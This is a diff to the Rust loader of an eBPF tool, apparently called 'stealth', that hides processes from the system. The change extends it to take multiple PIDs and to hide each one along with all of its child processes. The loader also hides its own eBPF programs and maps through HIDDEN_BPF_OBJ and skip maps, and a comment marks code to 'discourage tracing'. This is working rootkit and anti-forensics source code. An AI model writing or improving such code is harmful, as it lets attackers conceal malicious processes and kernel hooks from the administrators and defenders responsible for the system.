@@ -2,51 +2,24 @@ use std::{thread, time::Duration};
 
 use aya::{
     maps::{Array, HashMap},
-    EbpfLoader, Pod,
+    EbpfLoader,
 };
 use clap::Parser;
 use log::{debug, info, warn};
 use stealth::utils::{
-    fetch_pids_map_ids, get_descendants, list_active_maps, list_active_programs, write_to_tracefs,
-    Builder, SyscallTracepoint,
+    fetch_prog_ids_map_ids, get_descendants, list_active_maps, list_active_programs,
+    write_to_tracefs, Builder, HiddenPid, SyscallTracepoint,
 };
+use stealth_common::MAX_BPF_OBJ;
 use sysinfo::{Pid, ProcessesToUpdate, System};
 use tokio::signal;
 
 #[derive(Debug, Parser)]
 struct Opt {
-    #[clap(long, required = true)]
-    pid: String,
+    #[clap(long, value_delimiter = ',', required = true)]
+    pid: Vec<String>,
 }
-const MAX_PID_LENGTH: usize = 10; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise
 
-#[repr(C)]
-#[derive(Copy, Clone)]
-pub struct HiddenPid {
-    bytes: [u8; MAX_PID_LENGTH],
-    len: usize,
-}
-impl HiddenPid {
-    fn new(str_repr: &str) -> Self {
-        let mut bytes = [0u8; MAX_PID_LENGTH];
-        let len = str_repr.len().min(MAX_PID_LENGTH);
-        bytes[..len].copy_from_slice(str_repr.as_bytes());
-        debug!("{}", unsafe { std::str::from_utf8_unchecked(&bytes) });
-        Self { bytes, len }
-    }
-}
-#[repr(C)]
-#[derive(Debug, Copy, Clone)]
-pub struct QueuedDirent {
-    pub idx: u32,
-    pub bpos: u64,
-    pub d_off: i64,
-    pub d_reclen: u16,
-    pub d_type: u8,
-    pub d_name: [u8; 10],
-}
-unsafe impl Pod for QueuedDirent {}
-unsafe impl Pod for HiddenPid {}
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
     let Opt { pid } = Opt::parse();
@@ -83,23 +56,23 @@ async fn main() -> anyhow::Result<()> {
         tracepoints,
     };
 
-    let progs_info = builder.build()?;
+    let self_progs_info = builder.build()?;
 
-    let bpf_info = fetch_pids_map_ids(progs_info)?;
+    let self_bpf_info = fetch_prog_ids_map_ids(self_progs_info)?;
 
+    //setup HIDDEN_PIDS MAP
     let mut hidden_pids_array: Array<_, HiddenPid> =
         Array::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
 
     //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
-    let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
+    let mut hidden_obj_map: HashMap<_, u32, [u32; MAX_BPF_OBJ as usize]> =
         HashMap::try_from(ebpf.take_map("HIDDEN_BPF_OBJ").unwrap()).unwrap();
-    let mut hidden_progs = [0u32; 32];
-    for (idx, m) in bpf_info.prog_ids.iter().enumerate() {
+    let mut hidden_progs = [0u32; MAX_BPF_OBJ as usize];
+    for (idx, m) in self_bpf_info.prog_ids.iter().enumerate() {
         hidden_progs[idx] = *m
     }
-
-    let mut hidden_maps = [0u32; 32];
-    for (idx, m) in bpf_info.map_ids.iter().enumerate() {
+    let mut hidden_maps = [0u32; MAX_BPF_OBJ as usize];
+    for (idx, m) in self_bpf_info.map_ids.iter().enumerate() {
         hidden_maps[idx] = *m
     }
 
@@ -111,8 +84,8 @@ async fn main() -> anyhow::Result<()> {
         HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
     let mut map_skip_map: HashMap<_, u32, u32> =
         HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
-    let prog_ids = bpf_info.prog_ids;
-    let map_ids = bpf_info.map_ids;
+    let prog_ids = self_bpf_info.prog_ids;
+    let map_ids = self_bpf_info.map_ids;
 
     for p in prog_ids.clone() {
         info!("bpf prog: {} -> hide", p)
@@ -180,20 +153,23 @@ async fn main() -> anyhow::Result<()> {
 
     let mut sys = System::new_all();
     let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
-
-    hidden_pids_array.set(0, HiddenPid::new(&pid), 0).unwrap();
-    info!("pid: {} -> hide", pid);
-
-    let children = get_descendants(&sys, Pid::from(pid.parse::<usize>().unwrap()));
-    for (idx, child) in children.iter().enumerate() {
-        if let Some(task) = sys.process(*child) {
-            info!("pid: {} -> hide child: {} [{:?}]", pid, child, task.name());
-        } else {
-            info!("pid: {} -> hide child: {}", pid, child);
+    let mut idx = 0u32;
+    for p in pid.iter() {
+        hidden_pids_array.set(idx, HiddenPid::new(p), 0).unwrap();
+        info!("pid: {} -> hide", p);
+        idx += 1;
+        let children = get_descendants(&sys, Pid::from(p.parse::<usize>().unwrap()));
+        for child in children.iter() {
+            if let Some(task) = sys.process(*child) {
+                info!("pid: {} -> hide child: {} [{:?}]", p, child, task.name());
+            } else {
+                info!("pid: {} -> hide child: {}", p, child);
+            }
+            hidden_pids_array
+                .set(idx, HiddenPid::new(&child.to_string()), 0)
+                .unwrap();
+            idx += 1;
         }
-        hidden_pids_array
-            .set((idx + 1) as u32, HiddenPid::new(&child.to_string()), 0)
-            .unwrap();
     }
 
     //discourage tracing
